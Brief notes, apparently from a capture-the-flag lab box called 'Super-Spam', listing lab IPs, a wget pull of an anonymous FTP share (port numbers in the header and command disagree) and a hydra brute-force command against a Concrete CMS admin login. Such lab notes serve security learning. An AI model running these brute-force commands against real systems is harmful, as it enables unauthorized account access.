# Super-Spam 

> VOiD | Sunday 31 October 2021 10:07:51 PM IST

My IP : 10.8.253.221
Target IP : 10.10.6.172


## PORT 4901 [ftp]
```bash
wget -r ftp://anonymous:@10.10.6.172:4019/

```

## PORT 80 [Concrete CMS 8.5.2]
```bash


/concrete5/index.php/login/authenticate/concrete

uName=admin&uPassword=admin&ccm_token=1635740234%3Aac0746e860fa39d9131c7a7dbbacc9a6

hydra -l admin -P passes 10.10.6.172 http-post-form "/concrete5/index.php/login/authenticate/concrete:uName=^USER^&uPassword=^PASS^&ccm_token=1635740234%3Aac0746e860fa39d9131c7a7dbbacc9a6:Invalid username or password" -V -t 50

```


